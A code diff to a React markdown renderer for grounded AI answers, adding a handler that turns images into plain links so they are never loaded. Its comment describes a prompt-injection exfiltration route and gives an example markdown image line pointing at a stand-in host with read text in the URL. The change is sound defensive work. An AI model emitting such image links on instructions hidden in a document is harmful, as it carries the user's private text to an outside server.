@@ -182,6 +182,21 @@ export const GroundedAnswer = memo(function GroundedAnswer({
               </code>
             );
           },
+          img({ src, alt }) {
+            // Never loaded. The address of a picture is chosen by whoever wrote
+            // the text, and loading it would send that address to their server:
+            // a file with instructions hidden in it could have a model write
+            // "![](https://elsewhere/?what-it-read)" and carry text out of the
+            // page without a click. A link is the same address, but only goes
+            // anywhere if the reader decides to follow it.
+            const label = alt || 'image';
+            if (typeof src !== 'string' || !/^https?:\/\//i.test(src)) return <span>[{label}]</span>;
+            return (
+              <a href={src} target="_blank" rel="noopener noreferrer">
+                [{label}]
+              </a>
+            );
+          },
           a({ href, children, ...rest }) {
             if (typeof href === 'string' && href.startsWith(CITE_PREFIX)) {
               const marker = Number.parseInt(href.slice(CITE_PREFIX.length), 10);
